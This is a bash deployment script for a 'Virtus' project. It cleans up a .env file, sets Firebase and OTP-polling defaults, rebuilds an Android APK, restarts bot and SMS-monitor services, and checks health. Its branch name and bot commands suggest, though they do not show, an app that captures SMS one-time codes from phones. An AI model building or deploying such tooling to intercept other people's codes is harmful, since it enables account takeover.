#!/usr/bin/env bash
# One-tap VPS fix: .env cleanup, APK rebuild, bot restart, health check.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"
ENV_FILE="$ROOT/.env"
BRANCH="${VPS_BRANCH:-cursor/messages-path-otp-8042}"

echo "==> Virtus VPS fix (branch: $BRANCH)"

if [ -f "$ENV_FILE" ]; then
  python3 << 'PY'
import re
from pathlib import Path

env = Path(".env")
lines = env.read_text(encoding="utf-8", errors="replace").splitlines()
seen: dict[str, str] = {}
order: list[str] = []
for line in lines:
    m = re.match(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$", line.strip())
    if m:
        k, v = m.group(1), m.group(2)
        if k not in seen:
            order.append(k)
        seen[k] = v
    elif line.strip() == "" and (not order or order[-1] != "__blank__"):
        order.append("__blank__")

defaults = {
    "APK_CONFIG_DB": "https://base-e3797-default-rtdb.firebaseio.com",
    "VIRTUS_MODULE_DB": "https://virtus-module-default-rtdb.firebaseio.com",
    "FIREBASE_WORKERS": "128",
    "OTP_POLL_INTERVAL_SEC": "0.4",
    "OTP_POLL_TIMEOUT_SEC": "1.2",
    "PORT": "8000",
}
for k, v in defaults.items():
    seen.setdefault(k, v)

out: list[str] = []
for item in order:
    if item == "__blank__":
        out.append("")
    else:
        out.append(f"{item}={seen.pop(item)}")
for k in sorted(seen):
    out.append(f"{k}={seen[k]}")
env.write_text("\n".join(out).rstrip() + "\n", encoding="utf-8")
print("  .env deduped + APK_CONFIG_DB ensured")
PY
else
  echo "  WARN: no .env — copy from .env.example first"
fi

echo "==> git pull"
git fetch origin "$BRANCH"
git checkout "$BRANCH" 2>/dev/null || git checkout -b "$BRANCH" "origin/$BRANCH"
git pull origin "$BRANCH"

echo "==> python deps"
if [ -f requirements.txt ]; then
  pip install -q -r requirements.txt
fi

echo "==> build Astik APK"
export DEFAULT_CONFIG_DB="${APK_CONFIG_DB:-https://base-e3797-default-rtdb.firebaseio.com}"
if [ -f "$ENV_FILE" ]; then
  set -a
  # shellcheck disable=SC1090
  source "$ENV_FILE"
  set +a
  export DEFAULT_CONFIG_DB="${APK_CONFIG_DB:-$DEFAULT_CONFIG_DB}"
fi
(cd apk && bash build-apk.sh)

echo "==> restart bot"
for svc in virtus-bot virtus sms-monitor; do
  if systemctl list-unit-files "${svc}.service" 2>/dev/null | grep -q "${svc}.service"; then
    sudo systemctl restart "${svc}"
    echo "  restarted ${svc}"
    break
  fi
done

sleep 2
echo "==> health"
curl -sf "http://127.0.0.1:${PORT:-8000}/health" | python3 -m json.tool || true

BASE="${PUBLIC_BASE_URL:-http://127.0.0.1:${PORT:-8000}}"
echo ""
echo "Done."
echo "  APK download: ${BASE%/}/download/apk"
echo "  APK landing:  ${BASE%/}/apk"
echo "  Bot flow: /key generate → /a device → /mynum phone → /injecttest"
echo "  APK: same KEY → START SERVICE ON"
